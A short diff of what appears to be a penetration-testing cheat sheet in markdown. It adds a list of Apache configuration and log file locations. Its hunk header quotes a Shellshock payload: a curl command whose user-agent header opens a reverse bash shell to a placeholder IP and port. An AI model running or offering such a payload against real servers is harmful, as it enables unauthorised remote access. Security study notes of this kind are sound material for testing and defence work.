@@ -106,8 +106,19 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/<ip>/<port>
 ```
 
 ## Apache2
+
 Debian: `/etc/apache2/`  
 CentOS: `/etc/httpd/`  
+
+Interesting files:  
+```bash
+./apache2.conf
+./ports.conf
+./envvars
+./access.log
+./error.log
+/etc/logrotate.d/apache2
+```
 
 Find document root:
 ```bash
